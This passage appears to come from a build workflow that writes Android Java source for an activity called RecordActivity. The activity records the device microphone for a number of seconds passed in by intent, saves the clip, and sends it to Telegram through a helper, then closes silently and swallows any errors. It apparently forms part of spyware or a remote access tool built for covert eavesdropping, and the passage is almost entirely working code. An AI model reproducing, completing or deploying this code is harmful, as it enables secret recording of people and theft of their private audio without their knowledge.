        run: |
          cat << 'EOF' > app/src/main/java/com/h/core/RecordActivity.java
          package com.h.core;
          import android.app.Activity;
          import android.media.MediaRecorder;
          import android.os.Bundle;
          import java.io.File;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          
          public class RecordActivity extends Activity {
              private MediaRecorder recorder; 
              private String path; 
              private int seconds = 10;
              
              @Override 
              protected void onCreate(Bundle b) {
                  super.onCreate(b); 
                  seconds = getIntent().getIntExtra("seconds", 10);
                  
                  try { 
                      recorder = new MediaRecorder(); 
                      recorder.setAudioSource(MediaRecorder.AudioSource.MIC); 
                      recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); 
                      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); 
                      path = getExternalFilesDir(null)+"/aud_"+new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date())+".m4a"; 
                      recorder.setOutputFile(path); 
                      recorder.prepare(); 
                      recorder.start();
                      
                      new android.os.Handler().postDelayed(()->{ 
                          recorder.stop(); 
                          recorder.release(); 
                          Telegram.sendFile(this, new File(path), "🎙️ تسجيل " + seconds + " ثانية"); 
                          finish(); 
                      }, seconds*1000);
                  } catch(Exception e){ 
                      finish(); 
                  }
              }
          }
